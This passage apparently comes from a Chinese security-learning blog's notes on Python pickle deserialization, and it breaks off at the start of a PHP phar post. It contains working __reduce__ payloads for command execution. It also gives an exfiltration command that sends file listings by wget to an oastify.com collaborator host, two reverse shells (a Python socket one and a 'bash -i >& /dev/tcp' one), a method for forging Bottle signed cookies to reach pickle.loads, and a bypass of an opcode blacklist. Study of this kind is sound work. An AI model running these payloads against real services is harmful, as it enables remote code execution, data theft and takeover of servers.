SHORT_BINUNICODE &#x27;todo&#x27;</span><br><span class="hljs-string">   73: ]        EMPTY_LIST</span><br><span class="hljs-string">   74: (        MARK</span><br><span class="hljs-string">   75: \x8c         SHORT_BINUNICODE &#x27;分析pickle&#x27;</span><br><span class="hljs-string">   89: \x8c         SHORT_BINUNICODE &#x27;吃零食&#x27;</span><br><span class="hljs-string">  100: e            APPENDS    (MARK at 74)</span><br><span class="hljs-string">  101: u        SETITEMS   (MARK at 32)</span><br><span class="hljs-string">  102: b    BUILD</span><br><span class="hljs-string">  103: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 4</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="魔术方法-reduce-的RCE利用"><a href="#魔术方法-reduce-的RCE利用" class="headerlink" title="魔术方法__reduce__的RCE利用"></a>魔术方法__reduce__的RCE利用</h3><ul><li>是对象序列化机制的一个组成部分，效果和<strong>PHP</strong>的<code>__wakeup</code>差不多，都是在<em><strong>反序列化的时候会自动进行调用</strong></em></li><li>关键：pickle不是简单的数据转换，它会记录对象重建所需的代码逻辑（如调用类的<code>__reduce__</code>方法）</li><li>而与PHP不同的是，<code>__reduce__</code>这个魔术方法是可以人为控制的<ul><li>当使用pickle模块对对象进行序列化&#x2F;反序列化时，如果对象定义了<code>__reduce__</code>方法，pickle就会调用这个方法来获取序列化&#x2F;反序列化所需的信息</li></ul></li><li><strong>通常由对象自己定义</strong>，用于指定如何将对象转换为可序列化的形式，即定义对象如何被<em><strong>序列化或反序列化</strong></em></li><li><em><strong>值得注意的是</strong></em>：<code>__reduce__</code>的执行是在<code>__init__</code>之后的</li><li><em><strong>该函数返回一个元组</strong></em>：<ul><li>第一个元素是<em><strong>可调用对象</strong></em>（如函数、类等）</li><li>第二个元素是<em><strong>调用该可调用对象的参数</strong></em>（<strong>元组</strong>形式）</li><li>后续元素<strong>可选</strong>，如用于<code>__setstate__</code>的状态</li></ul></li><li>相比于其它的魔法方法，<code>__reduce__</code>不需要依赖<strong>对象本身的逻辑</strong>，只需要构造<code>__reduce__</code>返回的元组即可<ul><li>并且只需要反序列化数据中存在<code>__reduce__</code>即可，源代码中存在与否并不重要<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tmp</span>():<br>text = <span class="hljs-string">&quot;456&quot;</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, text</span>):<br><span class="hljs-variable language_">self</span>.text = text<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (tmp,(<span class="hljs-string">&quot;123&quot;</span>,))<br> <br>text = tmp(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>sertext = pickle.dumps(text)<br> <br>reltext = pickle.loads(sertext)<br><span class="hljs-built_in">print</span>(reltext.text)<br><span class="hljs-comment"># 此处输出123，可以发现text被覆盖了</span><br><span class="hljs-comment">## 删去__reduce__就会恢复正常</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exploit</span>:<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;calc&#x27;</span>,))<br><span class="hljs-comment"># 反序列化时执行 os.system(&#x27;calc&#x27;)（Windows 弹出计算器）</span><br><span class="hljs-comment"># 该函数返回一个元组</span><br><span class="hljs-comment">## 元组第一个元素：可调用的对象（如函数、类）</span><br><span class="hljs-comment">## 元组第二个元素：调用该对象时的参数，用一个元组包含</span><br><span class="hljs-comment">### 为什么要()：表示是元组类型</span><br><span class="hljs-comment">### 为什么要,(逗号)：单元素元组也要在元素后逗号，否则python不会将其识别为元组</span><br>data = pickle.dumps(exploit())<br>pickle.loads(data)  <span class="hljs-comment"># 此处会弹出计算器！</span><br><br><span class="hljs-comment"># payload</span><br><span class="hljs-keyword">import</span> subprocess  <br><span class="hljs-keyword">import</span> pickle  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-keyword">return</span> (subprocess.Popen, ([<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;id&#x27;</span>],))  <br>payload = pickle.dumps(Exploit())  <br>pickle.loads(payload)<br><br><span class="hljs-keyword">import</span> pickle, os  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-keyword">return</span> (os.popen, (<span class="hljs-string">&#x27;id&#x27;</span>,))  <br>payload = pickle.dumps(Exploit())  <br>pickle.loads(payload)<br><br><span class="hljs-keyword">import</span> pickle, builtins  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-comment"># getattr(builtins, &#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).system(&#x27;id&#x27;)&quot;)  </span><br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">getattr</span>(builtins, <span class="hljs-string">&#x27;eval&#x27;</span>), (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;id&#x27;)&quot;</span>,))  <br>payload = pickle.dumps(Exploit())  <br>pickle.loads(payload)<br></code></pre></td></tr></table></figure><h6 id="跳过fine-class检查"><a href="#跳过fine-class检查" class="headerlink" title="跳过fine_class检查"></a>跳过fine_class检查</h6><ul><li>RestrictedUnpickler通过重写<code>find_class()</code>禁止导入模块，但PVM中并非所有操作码都调用<code>find_class</code></li><li>根据官方文档，<code>find_class()</code>在处理全局对象时被触发（<code>GLOBAL/c</code>、协议4中的<code>STACK_GLOBAL/\x93</code>、协议2及以上中的<code>INST/i</code>、<code>OBJ/o</code>等会调用该方法）</li><li>如果攻击者构造不使用这些操作码（如尽量不使用<code>c/i/\x93</code>），就可绕过<code>find_class</code></li><li>例如，可以利用对象自身的属性或特殊方法来间接获得所需函数，无需再触发导入。通过绕过全局导入的操作码序列，可不触发find_class()检查，从而在受限环境中获取eval等函数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle  <br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-comment"># 不直接 import，也不直接 GLOBAL  </span><br><span class="hljs-comment"># 用现有对象的 __class__.__base__.__subclasses__() 拿到 builtins 的 eval  </span><br>builtins_eval = ().__class__.__base__.__subclasses__()[<span class="hljs-number">138</span>]  <span class="hljs-comment"># 假设138是catch_warnings类  </span><br><span class="hljs-comment"># 这里要遍历找到builtins模块再找eval  </span><br><span class="hljs-keyword">return</span> (builtins_eval, ())  <br>  <br><span class="hljs-comment"># 注意：这个是思路示例，实际要找到路径对应的类索引  </span><br>payload = pickle.dumps(Exploit())<br></code></pre></td></tr></table></figure></li></ul><h6 id="无回显外带"><a href="#无回显外带" class="headerlink" title="无回显外带"></a>无回显外带</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle  <br><span class="hljs-keyword">import</span> os  <br><span class="hljs-keyword">import</span> base64  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;wget tvs9lnb4c9choqoskqogia002r8iwbk0.oastify.com/`ls | tr &quot;\n&quot; &quot;_&quot;`&#x27;</span>,))  <br>  <span class="hljs-comment"># 由于外带的内容中如果存在换行的情况，会导致wget 命令无法正确解析域名，因此可以用上面的方法列出所有文件</span><br>payload = pickle.dumps(Evil())  <br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;&#x27;&#x27;python3 -c &quot;import os</span><br><span class="hljs-string">import socket</span><br><span class="hljs-string">import subprocess</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="hljs-string">s.connect((&#x27;&lt;Your IP&gt;&#x27;, 2333))</span><br><span class="hljs-string">os.dup2(s.fileno(), 0)</span><br><span class="hljs-string">os.dup2(s.fileno(), 1)</span><br><span class="hljs-string">os.dup2(s.fileno(), 2)</span><br><span class="hljs-string">subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;])&quot;&#x27;&#x27;&#x27;</span>,))<br><span class="hljs-comment"># -c:用python3来执行后面字符串形式的命令，这是一种无需创建.py文件即可快速执行python代码的方式</span><br><span class="hljs-comment"># import subprocess:该模块用于创建进程，这里用来启动一个shell</span><br><span class="hljs-comment"># socket.AF_INET:表示使用IPV4地址族</span><br><span class="hljs-comment"># socket.SOCK_STREAM:表示使用TCP协议</span><br><span class="hljs-comment"># s.fileno():获取socket连接的文件描述符</span><br><span class="hljs-comment"># os.dup2(s.fileno(),num):把该进程的文件描述符重定向到socket连接</span><br><span class="hljs-comment"># subprocess.call():执行一个外部命令</span><br><br><br>payload = pickle.dumps(Exploit())<br>hex_token = binascii.hexlify(payload).decode()<br><span class="hljs-comment"># decode():将字节串 bytes对象 解码为 str对象，这两个对象不能混合操作</span><br><span class="hljs-built_in">print</span>(hex_token)<br><span class="hljs-built_in">print</span>(payload)<br><br>obj = pickle.loads(payload)<br><br></code></pre></td></tr></table></figure><h3 id="bottle-request里的反序列化"><a href="#bottle-request里的反序列化" class="headerlink" title="bottle.request里的反序列化"></a>bottle.request里的反序列化</h3><h4 id="get-cookie"><a href="#get-cookie" class="headerlink" title="get_cookie()"></a>get_cookie()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">self, key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span><br><span class="hljs-string">            `secret` must match the one used to create the cookie (see</span><br><span class="hljs-string">            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span><br><span class="hljs-string">            cookie or wrong signature), return a default value. &quot;&quot;&quot;</span><br>        value = <span class="hljs-variable language_">self</span>.cookies.get(key) <span class="hljs-comment"># 从cookie中获得指定键名的cookie值</span><br>        <span class="hljs-keyword">if</span> secret: <span class="hljs-comment"># 如果提供了secret，则要进行签名验证来确保cookie的完整性和安全性</span><br>            <span class="hljs-comment"># See BaseResponse.set_cookie for details on signed cookies.</span><br>            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value.startswith(<span class="hljs-string">&#x27;!&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">in</span> value:<br>            <span class="hljs-comment"># 检查value存在，并且是否以!开头，?是用来分割签名（sig）和消息（msg）的标识</span><br>                sig, msg = <span class="hljs-built_in">map</span>(tob, value[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-number">1</span>))<br>                <span class="hljs-comment"># 跳过!，根据?分割取出签名和消息，用tob函数将字符串转换为字节</span><br>                <span class="hljs-built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()<span class="hljs-comment"># 使用secret,msg生成一个哈希签名用来验证cookie是否被篡改，这里同样使用了HMAC，并利用指定的digestmod算法（默认为hashlib.sha56）来计算哈希</span><br>                <span class="hljs-keyword">if</span> _lscmp(sig, base64.b64encode(<span class="hljs-built_in">hash</span>)):<span class="hljs-comment"># 使用_lscmp函数进行签名比较，验证是否被篡改</span><br>                    dst = pickle.loads(base64.b64decode(msg))<br>                    <span class="hljs-comment"># 签名通过则对消息进行解码，然后反序列化为原始数据结构</span><br>                    <span class="hljs-keyword">if</span> dst <span class="hljs-keyword">and</span> dst[<span class="hljs-number">0</span>] == key:<br>                    <span class="hljs-comment"># 确保解码得到的对象dst不是空，并且其第一个元素与请求的key匹配。如果匹配，则返回该cookie的值dst[1]</span><br>                        <span class="hljs-keyword">return</span> dst[<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">return</span> default<br>        <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br></code></pre></td></tr></table></figure><ul><li>很明显是利用cookie通过<code>get_cookie</code>的验证抵达反序列化，然后用<code>__reduce__</code>执行代码</li><li>这个函数其实没有验证消息是否是想要的，只是单纯用<strong>密钥</strong>验证是否正确（即通过间接方式验证<em><strong>密钥是否正确</strong></em>）</li></ul><h5 id="set-cookie"><a href="#set-cookie" class="headerlink" title="set_cookie()"></a>set_cookie()</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cookie</span>(<span class="hljs-params">self, name, value, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256, **options</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>._cookies:<br>            <span class="hljs-variable language_">self</span>._cookies = SimpleCookie()<br>            <span class="hljs-comment"># 检查cookie是否存在，不存在则初始化一个SimpleCookie对象</span><br><br>        <span class="hljs-comment"># Monkey-patch Cookie lib to support &#x27;SameSite&#x27; parameter</span><br>        <span class="hljs-comment"># https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1</span><br>        <span class="hljs-keyword">if</span> py &lt; (<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>):<br>            Morsel._reserved.setdefault(<span class="hljs-string">&#x27;samesite&#x27;</span>, <span class="hljs-string">&#x27;SameSite&#x27;</span>)<br>            <span class="hljs-comment"># 兼容旧版本python</span><br><br>        <span class="hljs-keyword">if</span> secret:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>                depr(<span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;Pickling of arbitrary objects into cookies is &quot;</span><br>                            <span class="hljs-string">&quot;deprecated.&quot;</span>, <span class="hljs-string">&quot;Only store strings in cookies. &quot;</span><br>                            <span class="hljs-string">&quot;JSON strings are fine, too.&quot;</span>)<span class="hljs-comment"># 不是字符串则发出警告，建议不要将任意对象序列化到cookie中</span><br>            encoded = base64.b64encode(pickle.dumps([name, value], -<span class="hljs-number">1</span>))<span class="hljs-comment"># 将cookie的名称和值打包成一个列表，然后进行序列化后base64加密</span><br>            sig = base64.b64encode(hmac.new(tob(secret), encoded,<br>digestmod=digestmod).digest())<span class="hljs-comment"># 生成签名</span><br>            value = touni(tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + encoded)<br>            <span class="hljs-comment"># 加上!和?标识，标识这是一个签名cookie</span><br>        <span class="hljs-comment"># 看到这就行了</span><br></code></pre></td></tr></table></figure><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><ul><li>很明显是要用<code>set_cookie</code>来伪造一个cookie，然后在里面放入想执行的代码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle,request,response,run,route<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cmd</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br>c = cmd()<br><span class="hljs-comment"># session = &#123;&quot;name&quot;:c&#125;</span><br>response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>,c,secret=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(response._cookies)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">运行报错：</span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">  File &quot;&quot;, line 7, in &lt;module&gt;</span><br><span class="hljs-string">    response.set_cookie(&quot;name&quot;,c,secret=&quot;secret&quot;)</span><br><span class="hljs-string">  File &quot;E:\python\python3.10.0\lib\site-packages\bottle.py&quot;, line 1869, in set_cookie</span><br><span class="hljs-string">    encoded = base64.b64encode(pickle.dumps([name, value], -1))</span><br><span class="hljs-string">_pickle.PicklingError: second item of the tuple returned by __reduce__ must be a tuple</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 无语了我去，犯弱智了，__reduce__第二个返回的第二个元素（元组形式）后面忘加&#x27;,&#x27;了</span><br></code></pre></td></tr></table></figure></li></ul><h6 id="cookie-encode"><a href="#cookie-encode" class="headerlink" title="cookie_encode()"></a>cookie_encode()</h6><ul><li>除了用<code>set_cookie</code>来间接获取加密后的cookie，还可以使用<code>bottle</code>里专门用来构造<code>cookie</code>的<code>cookie_encode</code>方法<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode<br>secret = <span class="hljs-string">&quot;secret&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cmd</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&gt;test.txt&#x27;)&quot;&quot;&quot;</span>,))<br>c = cmd()<br>exp = cookie_encode((<span class="hljs-string">&#x27;session&#x27;</span>,&#123;<span class="hljs-string">&quot;name&quot;</span>:[c]&#125;),secret)<br><span class="hljs-comment"># exp = cookie_encode((&#x27;name&#x27;,&#123;&quot;name&quot;:[c]&#125;),secret)</span><br><span class="hljs-built_in">print</span>(exp)<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="黑名单R字符与绕过"><a href="#黑名单R字符与绕过" class="headerlink" title="黑名单R字符与绕过"></a>黑名单R字符与绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br><br></code></pre></td></tr></table></figure><ul><li>如果我们构造的<strong>恶意pickle</strong>是利用<code>__reduce__</code>，则payload中会出现R指令，即一个R字符，这就是过滤的逻辑</li><li>可以使用i或者o指令编写的opcode（operration code：操作码）进行绕过<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># R</span><br><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># i</span><br><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># o</span><br><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/7777 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><em><strong>值得注意的是</strong></em>：由于我们这里使用的不是<em><strong>R指令</strong></em>，所以我们其实并不是通过调用<code>__reduce__</code>来发起攻击</li><li>更详细分析的见[[0-v0]]</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>HMAC</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2025/10/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/sijidou/p/13121358.html">利用phar协议造成php反序列化 - sijidou - 博客园</a></p><h3 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h3><ul><li>这类似于jar包。在jar包中，一个应用（包括所有的可执行、可访问文件）都被打包进去了</li><li>而PHAR(“Php ARchive”)是PHP中类似JAR的一种打包文件&#x2F;<strong>压缩文件</strong></li><li><em><strong>PHP&gt;&#x3D;5.3</strong></em>的情况下phar后缀文件时<em>默认开启支持</em>的，不需要任何额外安装就能使用</li><li>phar文件在缺省（默认）状态下是只读的，如果要创建phar文件的花话，需要更改一下<code>php.ini</code>的权限设置：<ul><li>将<code>phar.readonly</code>指令行改为<code>phar.readonly=0</code></li><li><em><strong>需要注意的是</strong></em>：<code>ini_set()</code>不能修改该参数，并且要记住<em><strong>该函数不是能修改所有参数</strong></em></li></ul></li><li>与不能在不同数据库之间转换的 PDO 不同，phar 还可以使用一行代码在 tar、zip 和 phar 文件格式之间进行转换。参见 <a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">Phar::convertToExecutable()</a> 中的示例</li></ul><h4 id="反序列化的利用"><a href="#反序列化的利用" class="headerlink" title="反序列化的利用"></a>反序列化的利用</h4><ul><li>利用phar文件会以<strong>序列化的形式</strong>存储用户子弟能够以的<code>meta-data</code>的特性</li><li>通过<code>phar://</code>协议对一个phar文件进行文件操作来触发反序列化<ul><li>因为php大部分文件系统函数通过<code>phar://</code>伪协议来解析<code>phar</code>文件的时候，都会将<code>meta-data</code>进行反序列化，受影响的函数如下所示<br><img src="/../img/2.png"></li></ul></li><li>因为在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了 <code>php_var_unserialize</code>，这使得可以构造一个特殊的phar包，使代码能够被发序列化<ul><li>值得注意的是，<code>__wakeup()</code>等方法不会被调用</li></ul></li><li>在使用<code>phar://</code>协议读取文件时，文件会被解析成phar，解析过程中又会触发<code>php_var_unserialize()</code>函数对<code>meta-data</code>数据的操作，造成反序列化</li></ul><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><ul><li><code>a stub</code>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但<em><strong>必须</strong></em>以<code>__HALT_COMPILER();</code>结尾，否则<strong>phar扩展无法识别该文件为phar文件</strong></li><li><code>a manifest describing the contents</code>：phar文件<em><strong>本质是一种压缩文件</strong></em>，其中每个被压缩的文件的权限、属性等信息都被放在这部分，并且这部分还会<strong>以序列化的形式存储用户自定义的meta-data</strong>，这是攻击的核心</li><li><code>the file contents</code>：被压缩文件的内容</li><li><code>[optional] a signature for verifying Phar integrity(phar file format only)</code>：签名，放在文件末尾</li></ul><h5 id="创建一个phar文件"><a href="#创建一个phar文件" class="headerlink" 